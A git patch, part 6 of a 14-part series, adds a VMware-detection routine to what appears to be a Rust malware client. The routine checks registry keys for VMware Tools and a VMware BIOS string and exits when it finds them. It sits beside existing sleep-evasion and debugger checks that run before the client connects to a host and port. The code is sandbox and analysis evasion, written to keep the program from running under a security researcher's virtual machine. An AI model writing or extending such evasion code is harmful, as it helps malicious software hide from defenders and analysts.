@@ -1,0 +1,77 @@
+From 23fee643bcc061fe5879499d24037c14db4eec50 Mon Sep 17 00:00:00 2001
+From: Ron Panduwana <panduwana@gmail.com>
+Date: Wed, 14 Oct 2026 08:07:20 +0700
+Subject: [PATCH 06/14] checkVMWare
+
+---
+ client/Cargo.toml     |  1 +
+ client/src/main.rs    |  2 ++
+ client/src/sandbox.rs | 27 +++++++++++++++++++++++++++
+ 3 files changed, 30 insertions(+)
+
+diff --git a/client/Cargo.toml b/client/Cargo.toml
+index a4cd8af..22b6d12 100644
+--- a/client/Cargo.toml
++++ b/client/Cargo.toml
+@@ -29,6 +29,7 @@ crate-type = ["cdylib"]
+ [target.'cfg(windows)'.dependencies]
+ winapi = { version = "0.3", features = ["debugapi","memoryapi"] }
+ ntapi = "0.4.1"
++winreg = "0.52"
+ windows = { version = "0.*", features = [
+     "Win32_System_Diagnostics_Debug",
+     "Win32_System_SystemInformation",
+diff --git a/client/src/main.rs b/client/src/main.rs
+index 2793b9c..214228f 100644
+--- a/client/src/main.rs
++++ b/client/src/main.rs
+@@ -41,6 +41,8 @@ fn main() {
+     sandbox::sleep_evasion(Duration::from_secs(1));
+     #[cfg(windows)]
+     sandbox::check_debugger();
++    #[cfg(windows)]
++    sandbox::check_vm_artifacts();
+ 
+     let mut host = "127.0.0.1".to_string();
+     let mut port = "8080".to_string();
+diff --git a/client/src/sandbox.rs b/client/src/sandbox.rs
+index fb20a79..58a1b7c 100644
+--- a/client/src/sandbox.rs
++++ b/client/src/sandbox.rs
+@@ -48,6 +48,33 @@ pub fn check_uptime_limit() {
+     }
+ }
+ 
++#[cfg(windows)]
++use winreg::enums::*;
++#[cfg(windows)]
++use winreg::RegKey;
++
++#[cfg(windows)]
++pub fn check_vm_artifacts() {
++    // Checking for common VMware registry keys
++    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
++    
++    // VMware Tools key
++    if let Ok(_key) = hklm.open_subkey("SOFTWARE\\VMware, Inc.\\VMware Tools") {
++        println!("VMware detected! Exiting program.");
++        exit(1);
++    }
++    
++    // System BIOS Version for VMware indicator
++    if let Ok(key) = hklm.open_subkey("HARDWARE\\Description\\System") {
++        if let Ok(bios_version) = key.get_value::<String, _>("SystemBiosVersion") {
++            if bios_version.contains("VMware") {
++                println!("VMware detected! Exiting program.");
++                exit(1);
++            }
++        }
++    }
++}
++
+ pub fn sleep_evasion(sleep_duration: Duration) {
+     let start_instant = Instant::now();
+     let start_system_time = SystemTime::now();
+-- 
+2.39.5 (Apple Git-154)
+
